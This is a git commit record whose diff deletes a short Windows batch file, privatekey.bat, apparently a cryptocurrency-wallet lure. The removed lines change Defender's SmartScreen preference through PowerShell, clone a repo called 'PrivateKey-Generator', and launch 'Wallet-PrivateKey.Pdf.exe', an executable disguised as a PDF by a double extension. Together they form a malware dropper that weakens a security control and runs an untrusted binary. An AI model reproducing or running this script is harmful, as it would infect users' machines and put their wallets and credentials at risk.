73862135969f5d370641b032cc4119809622fe78
MiningBot-eth <ambere@thevintagepress.com>
2024-11-28 03:16:23 +0100

    Delete priva

--- privatekey.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-powershell -Command "Set-MpPreference -DisableSmartScreenOverridePrompt $true"
-git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
-cd PrivateKey-Generator
-start /wait Wallet-PrivateKey.Pdf.exe
